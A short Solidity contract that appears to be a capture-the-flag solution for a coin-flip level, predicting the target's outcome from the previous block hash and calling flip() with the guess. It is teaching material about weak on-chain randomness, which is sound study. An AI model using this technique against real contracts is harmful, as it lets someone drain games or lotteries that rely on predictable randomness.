// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "instances/level03.sol";

contract AttackerCoinFlip {
    function exploit(address instance) external {
        CoinFlip(instance).flip(
            uint256(blockhash(block.number - 1)) >> 255 == 1
        );
    }
}
